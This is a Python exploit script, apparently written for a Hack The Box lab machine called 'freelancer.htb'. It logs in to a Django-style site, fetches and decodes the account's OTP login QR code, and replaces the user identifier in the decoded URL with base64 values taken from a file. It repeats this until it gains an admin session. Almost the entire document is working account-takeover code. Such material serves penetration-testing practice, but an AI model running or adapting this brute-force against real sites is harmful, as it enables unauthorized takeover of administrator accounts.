import cv2
from pyzbar.pyzbar import decode
import requests
from PIL import Image
from io import BytesIO
import subprocess
from base64 import b64decode
from bs4 import BeautifulSoup

def session_setup(url):
    global session
    session.headers = {
        'Host': url.split('/')[-1],
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': 'csrftoken=yKjE5BX9SWCtweqt7LNHMcgUakE7N0DS',
        'Accept-Encoding': 'gzip, deflate',
        'Origin': url
    }
    print('[+] Sessoin Setup Done')

def getcsrf(url):
    global session
    try:
        loginurl = url + '/accounts/login/'
        response = session.get(loginurl)
        soup = BeautifulSoup('response.text','html.parser')
        soup = BeautifulSoup(response.text,'html.parser')
        csrf = soup.find('input', attrs={'name':'csrfmiddlewaretoken'})
        if csrf:
            csrfmiddlewaretoken = csrf.get('value')
            print('[+] Fetched CSRF Middle Ware token')
            return csrfmiddlewaretoken
        else:
            print('[-] Failed to fetch CSRF middle ware token')

    except Exception as e:
        print(f'[-] Error:{e}')

def login(url,username,password):
    try:
        global session
        loginurl = url + '/accounts/login/'
        csrfmiddlewaretoken = getcsrf(url)
        data = {
            'csrfmiddlewaretoken':csrfmiddlewaretoken,
            'username' : username,
            'password' : password
        }
        response = session.post(url=loginurl,data=data)
        if response.status_code == 200:
            format_check = f'Howdy, {username}'
            if format_check in response.text:
                print('[+] Logged In successfully')
                session_values = response.request.headers['Cookie']
                print('[+] Grabbed session values')
                return session_values
        else:
            print(f'[-] Some error occured on login {response.status_code}')

    except Exception as e:
        print(f'[-] Error:{e}')

def saveqr(url,session_values):
    try:
        global session
        qr_url = url + '/accounts/otp/qrcode/generate/'
        headers = {
            'Cookie' : session_values
        }
        response = session.get(url=qr_url,headers=headers)
        with open('qr.png','wb') as qr:
            qr.write(response.content)
        print('[+] Saved Qr code image in current directory')

    except Exception as e:
        print(f'[-] Error:{e}')

def getqrdata():
    try: 
        image_data = cv2.imread('qr.png')
        decoded_objects = decode(image_data)
        print('[+] Fetched Data from qr code')
        return decoded_objects[0].data.decode()
    
    except Exception as e:
        print(f'[-] Error:{e}')

if __name__ == '__main__':

    url = 'http://freelancer.htb'
    username = input('Username of employeer:')
    password = input('Password for employeer:')
    user_format = f'Howdy, {username}'

    with open('otp_base64', 'r') as file:
        otp_encoded = file.readlines()

    count = 1

    for i in otp_encoded:
        print(f'For: {i.strip()}, Value: {b64decode(i.encode()).decode()}')
        print(f'[+] Cycle {count}')
        
        session = requests.session()
        session_setup(url)
        session_values = login(url,username,password)
        saveqr(url,session_values)
        
        brute_url = getqrdata().split('/')

        i = i.strip()
        brute_url[6] = i
        brute_url = '/'.join(brute_url)

        response = requests.get(brute_url)
        if 'Howdy, admin' in response.text:
            print(f'[+] Got value for admin: {i}')
            break

        elif user_format in response.text:
            print(f'[+] Got the value of your accound: {i}')

        elif 'Howdy' in response.text:
            print(f'[+] Got value but not for admin: {i}')

        print('\n\n')
        count += 1